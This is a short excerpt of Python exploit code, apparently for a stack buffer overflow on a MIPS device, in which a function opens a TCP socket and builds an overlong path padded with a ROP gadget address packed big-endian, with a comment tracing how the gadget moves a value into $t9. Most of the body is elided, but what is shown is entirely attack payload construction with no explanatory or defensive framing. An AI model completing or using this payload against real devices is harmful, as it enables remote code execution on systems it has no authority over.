...
def send_long_path(length, filler, ret_addr):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        ...
        long_path += p32(0x77fae424, endian="big")           # Loads s0 + 0xc (which eventually gets moved in $t9 via gadget)
